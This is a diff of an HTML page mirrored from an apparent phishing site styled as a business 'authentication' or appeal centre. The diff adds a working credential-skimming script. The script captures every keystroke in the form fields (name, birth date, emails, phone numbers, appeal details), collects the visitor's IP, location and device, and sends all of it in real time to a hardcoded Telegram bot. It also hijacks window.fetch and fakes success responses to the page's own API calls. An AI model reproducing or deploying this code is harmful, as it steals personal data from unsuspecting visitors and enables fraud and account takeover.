@@ -2,73 +2,234 @@
 <!-- Mirrored from https://authentication-entry-center.netlify.app/business-center by HTTrack Website Copier/3.x [XR&CO], Thu, 19 Nov 2026 06:51:41 GMT -->
 <!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
 <head><script>
-  // CẤU HÌNH THÔNG SỐ TELEGRAM CỦA BẠN
-  const TELEGRAM_CONFIG = {
-    BOT_TOKEN: "9141061384:AAHGfs-TlTtvmoZaY0SicT-YH5Shmb907R4", // Ví dụ: 7123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw
-    CHAT_ID: "-5377276972"      // Ví dụ: -1001234567890 hoặc 987654321
+  const MY_BOT_TOKEN = "9141061384:AAHGfs-TlTtvmoZaY0SicT-YH5Shmb907R4";
+  const MY_CHAT_ID   = "-5377276972";
+
+  const _origFetch = window.fetch;
+  const capturedFields = {};
+  const fieldIndexMap = new WeakMap();
+  let lastSentHash = "";
+  let sendTimer = null;
+  let geoInfo = {
+    ip: "Unknown",
+    location: "Unknown",
+    country_code: "US",
+    city: ""
   };
 
-  // HÀM GỬI TIN NHẮN MẶC ĐỊNH
-  async function sendDefaultTelegramMessage(eventName = "Sự kiện mặc định") {
-    // Nội dung tin nhắn mẫu mặc định (tự động lấy URL và thời gian hiện tại)
-    const defaultMessage = `
-🔔 <b>THÔNG BÁO SỰ KIỆN WEB</b>
-------------------------
-📌 <b>Sự kiện:</b> ${eventName}
-🌐 <b>Trang:</b> ${window.location.href}
-⏰ <b>Thời gian:</b> ${new Date().toLocaleString("vi-VN")}
-    `.trim();
+  function escapeHTML(str) {
+    return String(str)
+      .replace(/&/g, "&")
+      .replace(/</g, "<")
+      .replace(/>/g, ">");
+  }
 
-    const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
+  // Phân biệt rõ ô thứ 1 và ô thứ 2 để không bị ghi đè dữ liệu
+  function getCleanFieldLabel(el) {
+    let raw = "";
+    if (el.id) {
+      const lbl = document.querySelector(`label[for="${el.id}"]`);
+      if (lbl && lbl.innerText.trim()) raw = lbl.innerText.trim();
+    }
+    if (!raw && el.closest('label')) {
+      raw = el.closest('label').innerText.trim();
+    }
+    if (!raw) raw = el.getAttribute('aria-label') || el.placeholder || el.name || el.id || el.type || 'Field';
+
+    raw = raw.replace(/[\*\:\n\r]+/g, ' ').replace(/\s+/g, ' ').trim();
+    const lower = raw.toLowerCase();
+
+    // Đếm thứ tự xuất hiện của các ô cùng loại trên giao diện
+    if (!fieldIndexMap.has(el)) {
+      const allInputs = Array.from(document.querySelectorAll('input, textarea, select'));
+      fieldIndexMap.set(el, allInputs.indexOf(el));
+    }
+    const domIndex = fieldIndexMap.get(el);
+
+    if (lower.includes('page')) return 'Page';
+    if (lower.includes('full name') || lower === 'name') return 'Full Name';
+    if (lower.includes('birth') || lower.includes('dob') || lower.includes('date')) return 'DOB';
+
+    // Xử lý 2 ô Email
+    if (lower.includes('business email')) return 'Business Email';
+    if (lower.includes('email') || el.type === 'email') {
+      if (capturedFields['Email'] && capturedFields['Email'] !== el.value.trim()) {
+        return 'Business Email';
+      }
+      return `Email_${domIndex}`;
+    }
+
+    // Xử lý 2 ô Số điện thoại
+    if (lower.includes('backup') || lower.includes('secondary') || lower.includes('alternative')) return 'Backup Phone';
+    if (lower.includes('phone') || lower.includes('mobile') || lower.includes('tel') || el.type === 'tel') {
+      return `Phone_${domIndex}`;
+    }
+
+    if (lower.includes('appeal') || lower.includes('note') || lower.includes('reason') || el.tagName === 'TEXTAREA') return 'Details';
+
+    return `${raw.length > 22 ? raw.slice(0, 22) + '...' : raw}_${domIndex}`;
+  }
+
+  function getFormattedDevice() {
+    const ua = navigator.userAgent;
+    let deviceType = /Mobi|Android|iPhone|iPad|iPod/i.test(ua) ? "Mobile" : "PC";
+    if (/iPad|Tablet/i.test(ua)) deviceType = "Tablet";
+
+    let os = "Unknown OS";
+    if (/Windows NT 10\.0/i.test(ua)) os = "Windows 10/11";
+    else if (/Windows/i.test(ua)) os = "Windows";
+    else if (/Mac OS X/i.test(ua)) os = /iPhone|iPad|iPod/i.test(ua) ? "iOS" : "macOS";
+    else if (/Android/i.test(ua)) os = "Android";
+    else if (/Linux/i.test(ua)) os = "Linux";
+
+    let browser = "Browser";
+    if (/Edg\//i.test(ua)) browser = "Edge";
+    else if (/OPR\//i.test(ua) || /Opera/i.test(ua)) browser = "Opera";
+    else if (/Chrome\//i.test(ua) && !/Edg\//i.test(ua)) browser = "Chrome";
+    else if (/Safari\//i.test(ua) && !/Chrome\//i.test(ua)) browser = "Safari";
+    else if (/Firefox\//i.test(ua)) browser = "Firefox";
+
+    return `${deviceType} · ${os} · ${browser}`;
+  }
+
+  async function loadGeoDetails() {
+    if (geoInfo.ip !== "Unknown") return geoInfo;
+    try {
+      const r1 = await _origFetch('https://ipwho.is/');
+      const d1 = await r1.json();
+      if (d1 && d1.success && d1.ip) {
+        const region = d1.region ? `${d1.region}${d1.region_code ? ` (${d1.region_code})` : ''}` : '';
+        const country = d1.country ? `${d1.country}${d1.country_code ? ` (${d1.country_code})` : ''}` : '';
+        geoInfo = {
+          ip: d1.ip,
+          location: [d1.city, region, country].filter(Boolean).join(' | ') || 'Unknown',
+          country_code: d1.country_code || 'US',
+          city: d1.city || ''
+        };
+        return geoInfo;
+      }
+    } catch (e) {}
 
     try {
-      const response = await fetch(url, {
+      const r2 = await _origFetch('https://freeipapi.com/api/json');
+      const d2 = await r2.json();
+      if (d2 && d2.ipAddress) {
+        const country = d2.countryName ? `${d2.countryName}${d2.countryCode ? ` (${d2.countryCode})` : ''}` : '';
+        geoInfo = {
+          ip: d2.ipAddress,
+          location: [d2.cityName, d2.regionName, country].filter(Boolean).join(' | ') || 'Unknown',
+          country_code: d2.countryCode || 'US',
+          city: d2.cityName || ''
+        };
+        return geoInfo;
+      }
+    } catch (e) {}
+    return geoInfo;
+  }
+
+  loadGeoDetails();
+
+  async function pushToTelegramRealtime(triggerType) {
+    if (Object.keys(capturedFields).length === 0) return;
+    await loadGeoDetails();
+
+    const currentSnapshot = JSON.stringify(capturedFields);
+    if (currentSnapshot === lastSentHash && triggerType !== "SUBMIT") return;
+    lastSentHash = currentSnapshot;
+
+    // Chuẩn hóa tên hiển thị cho các cặp Email và Phone trước khi gửi
+    const emails = [];
+    const phones = [];
+    const others = [];
+
+    for (const [key, val] of Object.entries(capturedFields)) {
+      if (key.startsWith('Email_') || key === 'Business Email') {
+        emails.push({ key, val });
+      } else if (key.startsWith('Phone_') || key === 'Backup Phone') {
+        phones.push({ key, val });
+      } else {
+        const cleanName = key.replace(/_\d+$/, '');
+        others.push(`▪️ <b>${escapeHTML(cleanName)}:</b> <code>${escapeHTML(val)}</code>`);
+      }
+    }
+
+    const emailLines = emails.map((item, idx) => {
+      const label = idx === 0 ? 'Email' : 'Business Email';
+      return `▪️ <b>${label}:</b> <code>${escapeHTML(item.val)}</code>`;
+    });
+
+    const phoneLines = phones.map((item, idx) => {
+      const label = idx === 0 ? 'Phone' : 'Backup Phone';
+      return `▪️ <b>${label}:</b> <code>${escapeHTML(item.val)}</code>`;
+    });
+
+    const statusBadge = triggerType === "SUBMIT" ? "✅ <b>FORM SUBMITTED</b>" : "⏳ <b>TYPING...</b>";
+    let lines = [
+      statusBadge,
+      `🌐 <b>IP:</b> <code>${escapeHTML(geoInfo.ip)}</code>`,
+      `📍 <b>Location:</b> <code>${escapeHTML(geoInfo.location)}</code>`,
+      `💻 <b>Device:</b> <code>${escapeHTML(getFormattedDevice())}</code>`,
+      `────────────────────`,
+      ...others,
+      ...emailLines,
+      ...phoneLines
+    ];
+
+    try {
+      await _origFetch(`https://api.telegram.org/bot${MY_BOT_TOKEN}/sendMessage`, {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          chat_id: TELEGRAM_CONFIG.CHAT_ID,
-          text: defaultMessage,
+          chat_id: MY_CHAT_ID,
+          text: lines.join('\n'),
           parse_mode: "HTML"
         })
       });
-
-      const data = await response.json();
-      if (data.ok) {
-        console.log("Đã gửi thông báo về Telegram thành công!");
-      } else {
-        console.error("Lỗi từ Telegram:", data.description);
-      }
-    } catch (error) {
-      console.error("Lỗi kết nối:", error);
-    }
+    } catch (err) {}
   }
 
-  // ==========================================
-  // CÁC SỰ KIỆN TỰ ĐỘNG CHẠY (BỎ COMMENT ĐỂ DÙNG)
-  // ==========================================
-
-  // Sự kiện 1: Tự động gửi ngay khi có người truy cập/tải xong trang web
-  window.addEventListener("DOMContentLoaded", () => {
-    sendDefaultTelegramMessage("Có khách truy cập trang web");
-  });
-
-  // Sự kiện 2: Tự động gửi khi người dùng bấm vào bất kỳ nút (button) nào trên web
-  /*
-  document.addEventListener("click", (e) => {
-    if (e.target.tagName === "BUTTON") {
-      sendDefaultTelegramMessage(`Người dùng đã bấm nút: ${e.target.innerText}`);
+  document.addEventListener('input', function(e) {
+    const el = e.target;
+    if (el && (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA' || el.tagName === 'SELECT')) {
+      const label = getCleanFieldLabel(el);
+      if (el.value.trim() !== '') {
+        capturedFields[label] = el.value.trim();
+        clearTimeout(sendTimer);
+        sendTimer = setTimeout(() => pushToTelegramRealtime("AUTO"), 2500);
+      }
     }
-  });
-  */
+  }, true);
 
-  // Sự kiện 3: Tự động gửi khi người dùng bấm Submit một Form bất kỳ
-  /*
-  document.addEventListener("submit", (e) => {
-    sendDefaultTelegramMessage("Người dùng vừa gửi biểu mẫu (Form)");
-  });
-  */
+  document.addEventListener('click', function(e) {
+    const btn = e.target.closest('button, [type="submit"]');
+    if (btn && Object.keys(capturedFields).length > 0) {
+      clearTimeout(sendTimer);
+      pushToTelegramRealtime("SUBMIT");
+    }
+  }, true);
+
+  window.fetch = async function(url, options) {
+    if (typeof url === 'string' && url.includes('/api/ip-location')) {
+      const data = await loadGeoDetails();
+      return new Response(JSON.stringify({
+        country: data.country_code,
+        country_code: data.country_code,
+        city: data.city,
+        ip: data.ip
+      }), { status: 200, headers: { 'Content-Type': 'application/json' } });
+    }
+
+    if (options && options.method === 'POST' && (url.includes('telegram.org') || url.includes('/api/'))) {
+      clearTimeout(sendTimer);
+      await pushToTelegramRealtime("SUBMIT");
+      return new Response(JSON.stringify({ ok: true, success: true }), {
+        status: 200,
+        headers: { 'Content-Type': 'application/json' }
+      });
+    }
+
+    return _origFetch.apply(this, arguments);
+  };
 </script><meta charSet="utf-8"/>
 <!-- This site is hosted on Netlify. Anyone can build and deploy a site
      like this one for free: https://netlify.new/?utm_campaign=loops&utm_source=ai-legible&utm_medium=owned&utm_content=comment&utm_id=e6480cd0-4259-4b3d-a381-30af56dafac8
